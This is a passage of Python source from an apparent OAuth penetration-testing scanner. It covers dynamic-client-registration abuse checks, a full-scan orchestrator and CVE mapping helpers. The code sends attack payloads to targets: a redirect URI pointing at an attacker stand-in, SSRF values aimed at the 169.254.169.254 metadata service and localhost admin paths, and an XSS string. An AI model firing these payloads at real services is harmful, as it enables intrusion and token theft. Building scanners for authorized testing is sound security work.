        async with _make_oauth_client(self._socks_proxy) as client:
            for path in _OIDC_DISCOVERY_PATHS:
                disco_url = base_url + path
                resp = await self._send(client, "GET", disco_url)
                if resp and resp.status_code == 200:
                    try:
                        config = resp.json()
                        registration_endpoint = config.get(
                            "registration_endpoint", ""
                        )
                        break
                    except (json.JSONDecodeError, ValueError):
                        pass

            # Also try common DCR paths
            dcr_endpoints = []
            if registration_endpoint:
                dcr_endpoints.append(registration_endpoint)
            for path in _DCR_PATHS:
                if path.startswith("/.well-known"):
                    continue  # Already checked above
                url = base_url + path
                if url not in dcr_endpoints:
                    dcr_endpoints.append(url)

            for dcr_url in dcr_endpoints:
                if not self._in_scope(dcr_url):
                    continue

                # Test 1: Open registration (POST with minimal client metadata)
                client_metadata = {
                    "client_name": "OAuth Security Test",
                    "redirect_uris": [_EVIL_URL],
                    "grant_types": ["authorization_code"],
                    "response_types": ["code"],
                    "token_endpoint_auth_method": "client_secret_post",
                }
                resp = await self._send(
                    client, "POST", dcr_url,
                    json=client_metadata,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue

                if resp.status_code in (200, 201):
                    try:
                        reg_result = resp.json()
                        new_client_id = reg_result.get("client_id", "")
                        findings.append({
                            "vulnerable": True,
                            "technique": "dcr_open_registration",
                            "description": (
                                "Dynamic Client Registration is open (no auth). "
                                "Attacker can register clients with arbitrary "
                                "redirect_uris, enabling authorization code theft."
                            ),
                            "endpoint": dcr_url,
                            "registered_client_id": new_client_id,
                            "severity": "high",
                            "cves": ["CVE-2021-26715"],
                        })
                    except (json.JSONDecodeError, ValueError):
                        pass

                    # Test 2: SSRF via logo_uri
                    ssrf_metadata = {
                        "client_name": "SSRF Test",
                        "redirect_uris": ["https://example.com/callback"],
                        "logo_uri": "http://169.254.169.254/latest/meta-data/",
                        "client_uri": "http://169.254.169.254/latest/meta-data/",
                        "policy_uri": "http://[::ffff:169.254.169.254]/",
                        "tos_uri": "http://127.0.0.1:8080/admin",
                    }
                    resp_ssrf = await self._send(
                        client, "POST", dcr_url,
                        json=ssrf_metadata,
                        headers={"Content-Type": "application/json"},
                    )
                    if resp_ssrf and resp_ssrf.status_code in (200, 201):
                        findings.append({
                            "vulnerable": True,
                            "technique": "dcr_ssrf",
                            "description": (
                                "DCR accepts internal URLs in logo_uri/client_uri/"
                                "policy_uri/tos_uri. Server may fetch these URLs, "
                                "enabling SSRF to internal services."
                            ),
                            "endpoint": dcr_url,
                            "severity": "high",
                            "cves": ["CVE-2021-26715"],
                        })

                    # Test 3: XSS via client_name
                    xss_metadata = {
                        "client_name": '<img src=x onerror="alert(1)">',
                        "redirect_uris": ["https://example.com/callback"],
                    }
                    resp_xss = await self._send(
                        client, "POST", dcr_url,
                        json=xss_metadata,
                        headers={"Content-Type": "application/json"},
                    )
                    if resp_xss and resp_xss.status_code in (200, 201):
                        findings.append({
                            "vulnerable": True,
                            "technique": "dcr_xss",
                            "description": (
                                "DCR accepts HTML/JavaScript in client_name. "
                                "If displayed unescaped on consent screen, "
                                "enables XSS on the OAuth provider."
                            ),
                            "endpoint": dcr_url,
                            "severity": "medium",
                            "needs_manual_verification": True,
                        })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # Full Scan
    # ──────────────────────────────────────────────────────────────────

    async def full_scan(
        self,
        target_url: str,
        auth_endpoint: str = "",
        client_id: str = "",
        redirect_uri: str = "",
    ) -> dict[str, Any]:
        """Run all OAuth security tests.

        If auth_endpoint/client_id/redirect_uri are not provided,
        attempts auto-discovery first.

        Returns consolidated results with all findings.
        """
        start_time = time.monotonic()
        self._request_count = 0

        result: dict[str, Any] = {
            "target": target_url,
            "discovery": {},
            "redirect_uri_bypasses": [],
            "state_parameter": [],
            "pkce_downgrade": [],
            "code_reuse": [],
            "token_leakage": [],
            "dcr_abuse": [],
            "total_findings": 0,
            "total_requests": 0,
            "scan_duration_seconds": 0,
        }

        # Step 1: Discovery (if endpoints not provided)
        if not auth_endpoint or not client_id:
            discovery = await self.discover_oauth_endpoints(target_url)
            result["discovery"] = discovery
            if not auth_endpoint:
                auth_endpoint = discovery.get("auth_endpoint", "")
            if not client_id:
                client_ids = discovery.get("client_ids", [])
                client_id = client_ids[0] if client_ids else ""
            if not redirect_uri:
                redirect_uris = discovery.get("redirect_uris", [])
                redirect_uri = redirect_uris[0] if redirect_uris else ""

        if not auth_endpoint:
            result["error"] = (
                "No OAuth authorization endpoint found. "
                "Provide auth_endpoint manually or ensure the target uses OAuth."
            )
            result["total_requests"] = self._request_count
            result["scan_duration_seconds"] = round(
                time.monotonic() - start_time, 1
            )
            return result

        token_endpoint = ""
        if result["discovery"]:
            token_endpoint = result["discovery"].get("token_endpoint", "")

        # Use a fallback redirect_uri if none found
        if not redirect_uri:
            parsed = urlparse(auth_endpoint)
            redirect_uri = f"{parsed.scheme}://{parsed.hostname}/callback"

        logger.info(
            "oauth_scan_start",
            target=target_url[:80],
            auth_endpoint=auth_endpoint[:80],
            client_id=client_id[:30],
        )

        # Step 2: Run all test categories
        result["redirect_uri_bypasses"] = await self.test_redirect_uri_bypasses(
            auth_endpoint, client_id, redirect_uri
        )
        result["state_parameter"] = await self.test_state_parameter(
            auth_endpoint, client_id, redirect_uri
        )
        result["pkce_downgrade"] = await self.test_pkce_downgrade(
            auth_endpoint, token_endpoint, client_id, redirect_uri
        )
        result["code_reuse"] = await self.test_code_reuse(
            token_endpoint, client_id
        )
        result["token_leakage"] = await self.test_token_leakage(
            auth_endpoint, client_id, redirect_uri
        )
        result["dcr_abuse"] = await self.test_dcr_abuse(target_url)

        # Count total findings (only actual vulnerabilities, not info)
        vuln_count = 0
        for section in [
            "redirect_uri_bypasses", "state_parameter", "pkce_downgrade",
            "code_reuse", "token_leakage", "dcr_abuse",
        ]:
            for f in result[section]:
                if f.get("vulnerable"):
                    vuln_count += 1

        result["total_findings"] = vuln_count
        result["total_requests"] = self._request_count
        result["scan_duration_seconds"] = round(
            time.monotonic() - start_time, 1
        )

        logger.info(
            "oauth_scan_complete",
            target=target_url[:80],
            findings=vuln_count,
            requests=self._request_count,
            duration=result["scan_duration_seconds"],
        )

        return result


# ──────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────


def _classify_severity(technique: str) -> str:
    """Map redirect_uri bypass technique to severity level."""
    # Critical: full arbitrary redirect (account takeover risk)
    if technique in ("open_redirect", "userinfo_injection", "at_symbol"):
        return "high"
    # High: likely exploitable bypasses
    if technique in (
        "subdomain_bypass", "path_traversal", "url_encoding",
        "double_encoding", "backslash_confusion", "open_redirect_chain",
    ):
        return "high"
    # Medium: conditional exploitability
    if technique in (
        "param_pollution", "scheme_change", "wildcard_bypass",
        "dangerous_scheme", "null_byte", "dot_manipulation",
        "port_bypass",
    ):
        return "medium"
    # Low: theoretical / hard to exploit
    if technique in (
        "unicode_normalization", "idn_homograph", "ipv6_bypass",
        "localhost_bypass",
    ):
        return "medium"
    return "medium"


def _related_cves(technique: str) -> list[str]:
    """Return CVEs related to a bypass technique."""
    cve_map: dict[str, list[str]] = {
        "open_redirect": ["CVE-2019-3778", "CVE-2026-27191"],
        "subdomain_bypass": ["CVE-2023-6291", "CVE-2024-52289"],
        "path_traversal": ["CVE-2024-1132", "CVE-2023-6927"],
        "param_pollution": [],
        "url_encoding": ["CVE-2019-3778", "CVE-2023-6927"],
        "double_encoding": ["CVE-2023-6927", "CVE-2024-1132"],
        "userinfo_injection": ["CVE-2026-27191", "CVE-2023-6927"],
        "localhost_bypass": ["CVE-2020-5233", "CVE-2020-4037"],
        "scheme_change": ["CVE-2020-10776", "CVE-2023-28131"],
        "wildcard_bypass": ["CVE-2023-6927", "CVE-2023-6134", "CVE-2024-52289"],
        "unicode_normalization": [],
        "backslash_confusion": [],
        "at_symbol": ["CVE-2023-6291", "CVE-2023-6927"],
        "null_byte": [],
        "open_redirect_chain": ["CVE-2023-28131"],
        "dangerous_scheme": ["CVE-2020-10776", "CVE-2023-6134", "CVE-2024-21637"],
        "idn_homograph": [],
        "ipv6_bypass": [],
        "dot_manipulation": ["CVE-2023-6291", "CVE-2024-52289"],
        "port_bypass": ["CVE-2023-6291", "CVE-2023-6927"],
    }
    return cve_map.get(technique, [])
